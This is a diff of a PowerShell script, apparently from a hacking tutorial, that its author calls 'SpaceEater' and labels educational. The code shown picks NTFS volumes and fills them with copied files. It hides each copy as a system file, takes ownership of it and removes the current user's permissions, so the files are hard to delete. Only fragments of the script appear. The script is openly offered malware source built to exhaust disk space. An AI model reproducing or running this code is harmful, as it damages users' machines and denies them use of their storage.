@@ -2,7 +2,6 @@
 #Coded By Karem Ali 
 #Don't Run it on Your Pc , Run it on a Virtual Machine 
 #For Education Purpose Only 
-#It's Part of IHACK Scripting Tutorial
 $A = Get-Volume |where{$_.FileSystem -like "NTFS" }| select  -ExpandProperty  DriveLetter -Last 1 #Choose The Volume
 $B = " Karem Ali "  # Text in Text File which will take some of Space
 $H = ":"      #to Navigate , it's essential in Paths
@@ -39,7 +38,7 @@ Set-Location (Split-Path $Path.FullName)   # Change Directory to The File path
 copy $Item SpaceEater$C.KAF    # Copy Process 
 attrib +h +r +s SpaceEater$C.KAF   # Hide The Generated File as System File 
 takeown /f SpaceEater$C.KAF   # be The Owner of This File 
-echo y| Cacls SpaceEater$C.KAF /p $env:username:n  #Set The Privillige of Current User to No Thing 
+echo y| Cacls SpaceEater$C.KAF /p $env:username:n  #Set The Privillige of Current User to No Thing , Need Admin Rights to Perform This Command
 $C = get-volume | where{$_.DriveLetter -like "$Partitions[$count-1]" } | select -ExpandProperty SizeRemaining  # Get The Free Space of The Current Volume
 }
 $Count -= 1  # to Chnage The Volume and Go to Eat Space in another Volume
